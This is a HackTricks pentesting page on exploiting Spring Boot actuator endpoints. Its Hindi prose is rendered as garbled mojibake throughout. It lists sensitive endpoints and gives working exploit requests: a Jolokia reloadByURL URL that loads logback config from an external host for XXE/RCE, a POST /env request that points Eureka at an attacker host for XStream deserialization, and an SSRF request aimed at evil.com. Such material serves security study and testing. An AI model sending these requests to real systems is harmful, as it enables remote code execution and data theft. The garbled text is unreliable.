# рд╕реНрдкреНрд░рд┐рдВрдЧ рдПрдХреНрдЯреНрдпреВрдПрдЯрд░реНрд╕

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## **рд╕реНрдкреНрд░рд┐рдВрдЧ рдСрде рдмрд╛рдпрдкрд╛рд╕**

<figure><img src="../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>

**рд╕реЗ** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## рд╕реНрдкреНрд░рд┐рдВрдЧ рдмреВрдЯ рдПрдХреНрдЯреНрдпреВрдПрдЯрд░реНрд╕ рдХрд╛ рд╢реЛрд╖рдг

**рдореВрд▓ рдкреЛрд╕реНрдЯ рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ** [**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**]

### **рдореБрдЦреНрдп рдмрд┐рдВрджреБ:**

- рд╕реНрдкреНрд░рд┐рдВрдЧ рдмреВрдЯ рдПрдХреНрдЯреНрдпреВрдПрдЯрд░реНрд╕ `/health`, `/trace`, `/beans`, `/env` рдЖрджрд┐ рдЬреИрд╕реЗ рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдХреЛ рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░рддреЗ рд╣реИрдВред рд╕рдВрд╕реНрдХрд░рдг 1 рд╕реЗ 1.4 рддрдХ, рдЗрди рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рддрд╛рдХрддрд╡рд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдмрд┐рдирд╛ рдкрд╣реБрдВрдЪреЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рд╕рдВрд╕реНрдХрд░рдг 1.5 рдХреЗ рдмрд╛рдж, рдХреЗрд╡рд▓ `/health` рдФрд░ `/info` рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЧреИрд░-рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдбреЗрд╡рд▓рдкрд░реНрд╕ рдЕрдХреНрд╕рд░ рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░ рджреЗрддреЗ рд╣реИрдВред
- рдХреБрдЫ рдПрдХреНрдЯреНрдпреВрдПрдЯрд░ рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдХреНрд░рд┐рдпрд╛рдПрдБ рд╕рдВрднрд╡ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ:
- `/dump`, `/trace`, `/logfile`, `/shutdown`, `/mappings`, `/env`, `/actuator/env`, `/restart`, рдФрд░ `/heapdump`.
- рд╕реНрдкреНрд░рд┐рдВрдЧ рдмреВрдЯ 1.x рдореЗрдВ, рдПрдХреНрдЯреНрдпреВрдПрдЯрд░реНрд╕ рдореБрдЦреНрдп URL рдХреЗ рддрд╣рдд рдкрдВрдЬреАрдХреГрдд рд╣реЛрддреЗ рд╣реИрдВ, рдЬрдмрдХрд┐ 2.x рдореЗрдВ, рд╡реЗ `/actuator/` рдореВрд▓ рдкрде рдХреЗ рддрд╣рдд рд╣реЛрддреЗ рд╣реИрдВред

### **рд╢реЛрд╖рдг рддрдХрдиреАрдХреЗрдВ:**

1. **'/jolokia' рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рджреВрд░рд╕реНрде рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди**:
- `/jolokia` рдПрдХреНрдЯреНрдпреВрдПрдЯрд░ рдПрдВрдбрдкреЙрдЗрдВрдЯ Jolokia рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИ, рдЬреЛ MBeans рдХреЛ HTTP рдЙрдкрдпреЛрдЧ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
- `reloadByURL` рдХреНрд░рд┐рдпрд╛ рдХрд╛ рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдмрд╛рд╣реНрдп URL рд╕реЗ рд▓реЙрдЧрд┐рдВрдЧ рд╡рд┐рдиреНрдпрд╛рд╕реЛрдВ рдХреЛ рдкреБрдирдГ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдЬреЛ рдХреНрд░рд╛рдлреНрдЯреЗрдб XML рд╡рд┐рдиреНрдпрд╛рд╕реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдВрдзреЗрд░реЗ XXE рдпрд╛ рджреВрд░рд╕реНрде рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рддрдХ рд▓реЗ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
- рдЙрджрд╛рд╣рд░рдг рд╢реЛрд╖рдг URL: `http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml`.

2. **'/env' рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕рдВрд╢реЛрдзрди**:
- рдпрджрд┐ рд╕реНрдкреНрд░рд┐рдВрдЧ рдХреНрд▓рд╛рдЙрдб рдкреБрд╕реНрддрдХрд╛рд▓рдп рдореМрдЬреВрдж рд╣реИрдВ, рддреЛ `/env` рдПрдВрдбрдкреЙрдЗрдВрдЯ рдкрд░реНрдпрд╛рд╡рд░рдгреАрдп рдЧреБрдгреЛрдВ рдХрд╛ рд╕рдВрд╢реЛрдзрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
- рдЧреБрдгреЛрдВ рдХреЛ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдгрддрд╛рдУрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ Eureka serviceURL рдореЗрдВ XStream рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд╡рдВрд╢рд╛рдиреБрдХреНрд░рдордг рд╡рд┐рдХрд▓реНрдкред
- рдЙрджрд╛рд╣рд░рдг рд╢реЛрд╖рдг POST рдЕрдиреБрд░реЛрдз:

```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```

3. **рдЕрдиреНрдп рдЙрдкрдпреЛрдЧреА рд╕реЗрдЯрд┐рдВрдЧреНрд╕**:
- рдЧреБрдг рдЬреИрд╕реЗ `spring.datasource.tomcat.validationQuery`, `spring.datasource.tomcat.url`, рдФрд░ `spring.datasource.tomcat.max-active` рдХреЛ рд╡рд┐рднрд┐рдиреНрди рд╢реЛрд╖рдгреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ SQL рдЗрдиреНрдЬреЗрдХреНрд╢рди рдпрд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рдХрдиреЗрдХреНрд╢рди рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдмрджрд▓рдирд╛ред

### **рдЕрддрд┐рд░рд┐рдХреНрдд рдЬрд╛рдирдХрд╛рд░реА:**

- рдПрдХ рдкреВрд░реНрдг рд╕реВрдЪреА рдореЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдПрдХреНрдЯреНрдпреВрдПрдЯрд░реНрд╕ [рдпрд╣рд╛рдБ](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt) рдорд┐рд▓ рд╕рдХрддреА рд╣реИред
- рд╕реНрдкреНрд░рд┐рдВрдЧ рдмреВрдЯ 2.x рдореЗрдВ `/env` рдПрдВрдбрдкреЙрдЗрдВрдЯ рдЧреБрдгреЛрдВ рдХреЗ рд╕рдВрд╢реЛрдзрди рдХреЗ рд▓рд┐рдП JSON рдкреНрд░рд╛рд░реВрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рд╕рд╛рдорд╛рдиреНрдп рдЕрд╡рдзрд╛рд░рдгрд╛ рд╡рд╣реА рд░рд╣рддреА рд╣реИред

### **рд╕рдВрдмрдВрдзрд┐рдд рд╡рд┐рд╖рдп:**

1. **Env + H2 RCE**:
- `/env` рдПрдВрдбрдкреЙрдЗрдВрдЯ рдФрд░ H2 рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рд╕рдВрдпреЛрдЬрди рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд╡рд┐рд╡рд░рдг [рдпрд╣рд╛рдБ](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database) рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВред

2. **рдЧрд▓рдд рдкрдердирд╛рдорд╛ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реНрдкреНрд░рд┐рдВрдЧ рдмреВрдЯ рдкрд░ SSRF**:
- рдореИрдЯреНрд░рд┐рдХреНрд╕ рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ (`;`) рдХрд╛ рд╕реНрдкреНрд░рд┐рдВрдЧ рдлреНрд░реЗрдорд╡рд░реНрдХ рдХреЗ HTTP рдкрдердирд╛рдореЛрдВ рдореЗрдВ рд╕рдВрдЪрд╛рд▓рди рдХреЛ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдЕрдиреБрд░реЛрдз рдлрд░реНрдЬреА (SSRF) рдХреЗ рд▓рд┐рдП рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
- рдЙрджрд╛рд╣рд░рдг рд╢реЛрд╖рдг рдЕрдиреБрд░реЛрдз:

```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
